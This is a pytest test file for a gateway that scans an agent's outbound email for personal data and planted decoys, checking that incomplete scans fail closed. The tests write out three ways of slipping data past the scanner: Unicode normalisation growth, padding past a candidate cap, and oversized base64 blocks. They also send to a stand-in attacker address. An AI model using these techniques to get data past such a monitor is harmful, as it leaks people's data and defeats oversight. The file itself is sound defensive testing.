"""Checks: an incomplete scan is never reported as clean.

The gateway treats ``ScanResult.truncated`` as its fail-closed signal. Every
way a scan can stop early must therefore set it. Before these tests existed,
three did not, and a message carrying a planted decoy was sent to an external
address in protect mode with the rule ``outbound_clean``.

One behaviour per test. Each evasion is checked twice: once at the detector,
and once end to end through the gateway, because the detector returning the
right flag is only useful if the gateway acts on it.
"""

import base64

import pytest

from backend import detector, gateway, seeder, sessions

# U+FDFA expands to 18 characters under NFKC. A short raw body therefore
# becomes a very long normalised one.
EXPANDING_CHAR = "ﷺ"

EXTERNAL = "attacker@exfil.test"


@pytest.fixture(autouse=True)
def _databases(run_id):
    """Every test here touches both databases, so initialise both."""
    seeder.init_registry()
    return run_id


@pytest.fixture
def seeded_workspace():
    """Plant the decoys, then put the workspace back as it was."""
    seeder.unseed()
    seeder.seed()
    yield
    seeder.unseed()


@pytest.fixture
def decoy_email(seeded_workspace):
    """A planted decoy's email address, taken from the registry."""
    for canary in seeder.list_registered_canaries():
        for value in canary.strong_values():
            if "@" in str(value):
                return str(value)
    pytest.skip("no email-shaped decoy was planted")


def _send(body: str) -> dict:
    """Send one message from a fresh protect-mode session."""
    session = sessions.create_agent_session(
        "worst_case", "protect", "normal_order_1042"
    )
    return gateway.execute(
        session.session_id,
        "send_email",
        {"recipient": EXTERNAL, "subject": "report", "body": body},
    )


# ---------------------------------------------------------------------------
# Normalisation growth
# ---------------------------------------------------------------------------


def test_normalisation_growth_marks_the_scan_truncated():
    """NFKC can expand text past the limit even when the raw text fits."""
    body = EXPANDING_CHAR * 12000 + " anything"
    assert not detector.exceeds_scan_limit(body), "raw text is under the limit"
    assert len(detector._prepare(body)) > detector.MAX_INPUT_BYTES
    assert detector.scan(body).truncated is True


def test_decoy_hidden_behind_normalisation_growth_is_not_sent(decoy_email):
    outcome = _send(EXPANDING_CHAR * 12000 + " " + decoy_email)
    assert outcome["allowed"] is False
    assert outcome.get("delivery_status") != "simulated_sent"


# ---------------------------------------------------------------------------
# The candidate cap
# ---------------------------------------------------------------------------


def _many_blocks(payload: str, filler_count: int) -> str:
    blocks = [
        base64.b64encode(f"filler block {index:04d} padding".encode()).decode()
        for index in range(filler_count)
    ]
    blocks.append(base64.b64encode(payload.encode()).decode())
    return "\n".join(blocks)


def test_reaching_the_candidate_cap_marks_the_scan_truncated():
    body = _many_blocks("contact someone@example.org", detector.MAX_CANDIDATES + 10)
    assert detector.scan(body).truncated is True


def test_decoy_past_the_candidate_cap_is_not_sent(decoy_email):
    outcome = _send(_many_blocks(f"contact {decoy_email}", detector.MAX_CANDIDATES + 10))
    assert outcome["allowed"] is False
    assert outcome.get("delivery_status") != "simulated_sent"


# ---------------------------------------------------------------------------
# Oversized encoded blocks
# ---------------------------------------------------------------------------


def _oversized_block(payload: str) -> str:
    filler = "x" * (detector.MAX_BLOCK_CHARS * 3)
    return base64.b64encode((filler + " " + payload).encode()).decode()


def test_oversized_encoded_block_marks_the_scan_truncated():
    body = _oversized_block("contact someone@example.org")
    assert len(body) > detector.MAX_BLOCK_CHARS
    assert detector.scan(body).truncated is True


def test_decoy_in_an_oversized_block_is_not_sent(decoy_email):
    outcome = _send(_oversized_block(f"contact {decoy_email}"))
    assert outcome["allowed"] is False
    assert outcome.get("delivery_status") != "simulated_sent"


# ---------------------------------------------------------------------------
# Ordinary content is still scanned normally
# ---------------------------------------------------------------------------


def test_a_short_clean_message_is_not_marked_truncated():
    """The fail-closed path must not swallow ordinary messages."""
    result = detector.scan("Thanks, your order 1042 shipped on Tuesday.")
    assert result.truncated is False


def test_one_ordinary_encoded_block_is_still_decoded():
    encoded = base64.b64encode(b"contact someone@example.org").decode()
    result = detector.scan(f"see attachment: {encoded}")
    assert result.truncated is False
    assert any(item.value == "someone@example.org" for item in result.personal)


# ---------------------------------------------------------------------------
# URL host parsing
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "host,expected",
    [
        ("limco.example", True),
        ("LIMCO.EXAMPLE", True),
        ("limco.example.", True),
        ("orders.limco.example", True),
        ("evil-limco.example", False),
        ("notlimco.example", False),
        ("limco.example.attacker.test", False),
        ("", False),
    ],
)
def test_internal_host_boundary(host, expected):
    """A hostile suffix is not the company domain."""
    assert gateway._is_internal_host(host) is expected


@pytest.mark.parametrize("url", ["https://[abc", "https://[::1", "http://["])
def test_malformed_url_does_not_raise(url):
    """A URL that cannot be parsed yields a host, not an exception."""
    host = gateway._host_of(url)
    assert isinstance(host, str) and host
    assert gateway._is_internal_host(host) is False


def test_malformed_url_with_personal_data_is_held_not_crashed():
    body = (
        "Customer mei.ling.tan@example.org, +65 9123 4567. "
        "See https://[abc for details."
    )
    outcome = _send(body)
    assert outcome["allowed"] is False
    assert outcome.get("delivery_status") != "simulated_sent"
